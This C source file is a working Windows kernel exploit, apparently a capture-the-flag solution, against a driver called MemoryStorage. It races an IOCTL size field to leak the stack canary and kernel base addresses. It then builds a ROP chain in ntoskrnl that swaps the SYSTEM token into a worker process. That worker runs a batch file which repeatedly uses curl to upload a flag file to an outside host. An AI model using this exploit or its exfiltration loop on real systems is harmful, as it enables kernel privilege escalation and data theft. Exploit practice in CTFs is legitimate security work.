#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>

typedef struct {
    ULONG size;
    PVOID addr;
} MEM, * PMEM;

typedef struct {
    ULONG64 canary;
    ULONG64 driver_base;
    ULONG64 ntoskrnl_base;
} LEAK, * PLEAK;

HANDLE handle;
PMEM mem;
PVOID rop;
BOOL GO = false;

/*
1: kd> dps rdx
ffff830f`511a25a0  00000000`00000000
ffff830f`511a25a8  00000000`00000000
ffff830f`511a25b0  00000000`00000000
ffff830f`511a25b8  00000000`00000000
ffff830f`511a25c0  00000000`00000000
ffff830f`511a25c8  00000000`00000000
ffff830f`511a25d0  00000000`00000000
ffff830f`511a25d8  00000000`00000000
ffff830f`511a25e0  ffff492d`18495274
ffff830f`511a25e8  fffff803`9da1973a nt!MiResolvePrivateZeroFault+0x58a
ffff830f`511a25f0  ffffe782`fb146000
ffff830f`511a25f8  fffff803`340b1434 MemoryStorage+0x1434
ffff830f`511a2600  000001e7`6f4b6110
ffff830f`511a2608  ffff830f`00000010
ffff830f`511a2610  00000000`00000000
ffff830f`511a2618  fffff803`9db239f9 nt!KeLeaveCriticalRegionThread+0x9

1: kd> dq nt!KeLeaveCriticalRegionThread+0x9-nt
00000000`003239f9  ????????`???????? ????????`????????

1: kd> dq nt!MiResolvePrivateZeroFault+0x58a-nt
00000000`0021973a  ????????`???????? ????????`????????
*/

void StealTheContext(LPVOID lpParam) {
    PLEAK pLeak = (PLEAK)lpParam;

    while (1) {
        HANDLE hMap = OpenFileMappingW(
            FILE_MAP_ALL_ACCESS,
            FALSE,
            L"Global\\LoggingMemoryInformationForInternalMemoryStorageDriver"
        );

        if (!hMap) {
            DWORD error = GetLastError();
            //printf("OpenFileMappingW failed with error: %d\n", error);
            continue;
        }

        LPVOID userAddr = MapViewOfFile(
            hMap,
            FILE_MAP_READ,
            0, 0,
            0x1000
        );

        if (userAddr && *((char*)userAddr + 0x58)) {
            printf("userAddr: %p\n", userAddr);
            ULONG64 canary = *(ULONG64*)((char*)userAddr + 0x40);
            ULONG64 driver_leak = *(ULONG64*)((char*)userAddr + 0x58);
            ULONG64 ntoskrnl_leak = *(ULONG64*)((char*)userAddr + 0x78);

            pLeak->canary = canary;
            pLeak->driver_base = driver_leak - 0x1434;
            pLeak->ntoskrnl_base = ntoskrnl_leak - 0x3239f9;

            return;
        }

        CloseHandle(hMap);
    }
}

void TriggerLogging() {
    char input[8];

    Sleep(100);

    for (int i = 0; i < 0x800; i++) {
        *(ULONG64*)input = i;
        DeviceIoControl(handle, 0x7101010, input, 8, 0, 0, 0, 0);
    }
}

void RaceSize() {
    while (1)
        mem->size ^= 0x300;
}

void CreateReadStorage() {
    Sleep(100);

    PVOID leak = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(leak, 0, 0x1000);

    mem->size = 0x40;

    for (int i = 0; i < 0x100; i++) {
        DeviceIoControl(handle, 0x7101007, mem, 0x10, 0, 0, 0, 0);
    }

    while (!GO) {
        Sleep(500);
    }

    mem = (PMEM)malloc(sizeof(MEM));
    mem->size = 0x40;
    mem->addr = rop;

    while (1) {
        DeviceIoControl(handle, 0x7101003, mem, 0x10, 0, 0, 0, 0);
        Sleep(100);
    }
}

//#define BAT_PATH      "C:\\Windows\\Temp\\read.bat"
#define BAT_PATH      "C:\\Users\\Public\\read.bat"
#define TARGET_FILE   "C:\\Windows\\System32\\flag.txt"
#define UPLOAD_BASE   "http://[URL]/?flag="
ULONG workerPID = 0;

BOOL MakeWorker(void) {
    const char* batTemplate =
        "@echo off\r\n"
        ":loop\r\n"
        "  curl -G \"%s\" --data-urlencode \"flag@%s\"\r\n"
        "  timeout /t 1 /nobreak >nul\r\n"
        "goto loop\r\n";
    char batContent[512];
    snprintf(batContent, sizeof(batContent),
        batTemplate,
        UPLOAD_BASE,
        TARGET_FILE);

    HANDLE hFile = CreateFileA(
        BAT_PATH,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    DWORD written;
    WriteFile(hFile, batContent, (DWORD)strlen(batContent), &written, NULL);
    CloseHandle(hFile);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmdLine[MAX_PATH + 32];

    snprintf(cmdLine, sizeof(cmdLine),
        "cmd.exe /C \"%s\"", BAT_PATH);

    if (!CreateProcessA(
        NULL,
        cmdLine,
        NULL, NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return FALSE;
    }

    workerPID = pi.dwProcessId;

    return TRUE;
}

int main() {
    MakeWorker();    

    handle = CreateFileW(L"\\\\.\\MemoryStorage", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    printf("handle: %x\n", handle);

    mem = (PMEM)malloc(sizeof(MEM));
    memset(mem, 0, sizeof(MEM));

    mem->size = 0x40;
    mem->addr = &mem;

    HANDLE hRace = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RaceSize, 0, 0, 0);
    HANDLE hRead = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CreateReadStorage, 0, 0, 0);

    Sleep(1000);
    TerminateThread(hRace, 0);

    PLEAK pLeak = (PLEAK)malloc(sizeof(LEAK));
    memset(pLeak, 0, sizeof(LEAK));

    HANDLE hSteal = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StealTheContext, pLeak, 0, 0);
    HANDLE hTrigger = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TriggerLogging, 0, 0, 0);

    WaitForSingleObject(hSteal, INFINITE);
    WaitForSingleObject(hTrigger, INFINITE);

    printf("canary: %p\n", pLeak->canary);
    printf("driver_leak: %p\n", pLeak->driver_base);
    printf("ntoskrnl_leak: %p\n", pLeak->ntoskrnl_base);

    Sleep(2000);

    //0x140785bb8: pop rcx; ret; (1 found)
    //0x1407e2f63: pop rcx ; ret ; (1 found)
    ULONG64 pop_rcx_ret = pLeak->ntoskrnl_base + 0x7e2f63;
    //0x140810b8c: pop rdx ; ret ; (1 found)
    //0x1408c18e4: pop rdx; ret; (1 found)
    ULONG64 pop_rdx_ret = pLeak->ntoskrnl_base + 0x8c18e4;
    //0x1404a317d: pop r8 ; ret ; (1 found)
    //0x1406f8375: pop r8 ; ret ; (1 found)
    ULONG64 pop_r8_ret = pLeak->ntoskrnl_base + 0x6f8375;
    //0x1406f54a5: pop rax ; ret ; (1 found)
    //0x1406f54a5: pop rax; ret; (1 found)
    ULONG64 pop_rax_ret = pLeak->ntoskrnl_base + 0x6f54a5;
    //0x1406f17f7: add rsp, 0x28 ; ret ; (1 found)
    //0x1406f17f7: add rsp, 0x28; ret; (1 found)
    ULONG64 add_rsp_0x28_ret = pLeak->ntoskrnl_base + 0x6f17f7;
    //0x140805d8b: add rax, rcx ; ret ; (1 found)
    //0x14080677b: add rax, rcx ; ret ; (1 found)
    ULONG64 add_rax_rcx_ret = pLeak->ntoskrnl_base + 0x80677b;
    //0x140ab279d: and rax, rdx ; ret ; (1 found)
    //0x140aaf82d: and rax, rdx ; ret ; (1 found)
    ULONG64 and_rax_rdx_ret = pLeak->ntoskrnl_base + 0xaaf82d;
    //0x1402a008c: mov rax, qword [rcx+0x48] ; ret ; (1 found)
    //0x14028ff4c: mov rax, qword [rcx+0x48] ; ret ; (1 found)
    ULONG64 mov_rax_ptr_rcx_0x48_ret = pLeak->ntoskrnl_base + 0x28ff4c;
    //0x140947379: mov r8, qword [rax] ; mov rax, r8 ; ret ; (1 found)
    //0x140942619: mov r8, qword [rax] ; mov rax, r8 ; ret ; (1 found)
    ULONG64 mov_r8_qword_rax_ret = pLeak->ntoskrnl_base + 0x942619;
    //0x1408e0a6a: mov rax, rdx; ret; (1 found)
    //0x1408f9a9a: mov rax, rdx ; ret ; (1 found)
    ULONG64 mov_rax_rdx_complex_ret = pLeak->ntoskrnl_base + 0x8f9a9a;
    //0x14077f065: mov qword [r8], rax; ret; (1 found)
    //0x14077fa05: mov qword [r8], rax ; ret ; (1 found)
    ULONG64 mov_ptr_r8_rax_ret = pLeak->ntoskrnl_base + 0x77fa05;
    // 0x140b78326: mov rax, qword [rax] ; ret ; (1 found)
    // 0x140b7a326: mov rax, qword [rax] ; ret ; (1 found)
    ULONG64 mov_rax_ptr_rax_ret = pLeak->ntoskrnl_base + 0xb7a326;
    // 0x14020333e: \xeb\xfe
    ULONG64 jmp_self = pLeak->ntoskrnl_base + 0x20333e;

    ULONG64 PsLookupProcessByProcessId = pLeak->ntoskrnl_base + 0x914a00;
    ULONG64 KiKernelSysretExit = pLeak->ntoskrnl_base + 0xbb2dc0;

    rop = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(rop, 0x0, 0x1000);

    ULONG idx = 8;
    *((ULONG64*)rop + idx++) = pLeak->canary;
    idx += 2;

    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = workerPID;
    *((ULONG64*)rop + idx++) = pop_rdx_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x800; // Worker EPROCESS
    *((ULONG64*)rop + idx++) = PsLookupProcessByProcessId;

    *((ULONG64*)rop + idx++) = add_rsp_0x28_ret;
    idx += 5;

    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x800 - 0x48;
    *((ULONG64*)rop + idx++) = mov_rax_ptr_rcx_0x48_ret;
    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = 0x248;
    *((ULONG64*)rop + idx++) = add_rax_rcx_ret; // Worker EPROCESS Token Address
    *((ULONG64*)rop + idx++) = pop_r8_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x800;
    *((ULONG64*)rop + idx++) = mov_ptr_r8_rax_ret;

    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = 4;
    *((ULONG64*)rop + idx++) = pop_rdx_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x808; // System EPROCESS
    *((ULONG64*)rop + idx++) = PsLookupProcessByProcessId;

    *((ULONG64*)rop + idx++) = add_rsp_0x28_ret;
    idx += 5;

    *((ULONG64*)rop + idx++) = pop_rax_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x800; // Current EPROCESS Token
    *((ULONG64*)rop + idx++) = mov_r8_qword_rax_ret; // r8 == Worker EPROCESS Token Address

    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = (ULONG64)rop + 0x808 - 0x48;
    *((ULONG64*)rop + idx++) = mov_rax_ptr_rcx_0x48_ret;  // rax == System EPROCESS Value
    *((ULONG64*)rop + idx++) = pop_rcx_ret;
    *((ULONG64*)rop + idx++) = 0x248;
    *((ULONG64*)rop + idx++) = add_rax_rcx_ret; // rax == SYSTEM EPROCESS Token Address
    
    *((ULONG64*)rop + idx++) = mov_rax_ptr_rax_ret;
    *((ULONG64*)rop + idx++) = pop_rdx_ret;
    *((ULONG64*)rop + idx++) = 0xFFFFFFFFFFFFFFF0;
    *((ULONG64*)rop + idx++) = and_rax_rdx_ret; // rax == Clean SYSTEM Token Value

    *((ULONG64*)rop + idx++) = mov_ptr_r8_rax_ret;  // Current[Token] = System Token            
    
    *((ULONG64*)rop + idx++) = jmp_self;

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RaceSize, 0, 0, 0);

    Sleep(500);

    GO = true;

    while (1) {
        Sleep(3000);
    }
}